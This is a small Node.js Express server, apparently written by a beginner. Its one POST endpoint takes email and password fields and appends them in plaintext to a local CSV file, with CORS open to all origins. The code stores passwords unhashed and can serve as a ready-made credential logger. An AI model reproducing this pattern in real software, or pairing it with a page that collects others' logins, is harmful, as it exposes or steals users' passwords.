const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3000;

// Enable CORS for all origins
//Dunno what it does but I got a null origin error without it. I think it is because the origin is different so the CORS allows unknown sources(?)
app.use(cors());


app.use(express.static(path.join(__dirname, 'public')));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post('/upload', (req, res) => {
    const { email, password } = req.body;

    // Data to write to CSV, path being towards the same folder
    // Append to newline first
    const data = `\n${email} | ${password}`;
    const filePath = path.join(__dirname, 'user_data.csv');

    // Append data to the CSV file
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error('Error writing to file', err);
            return res.status(500).send('Error writing to file');
        }
        res.send('Data saved successfully');
    });
});
// Simplest way I could figure it out was printing and listening to port.
app.listen(port, () => {
    console.log(`Server at http://localhost:${port}`);
});
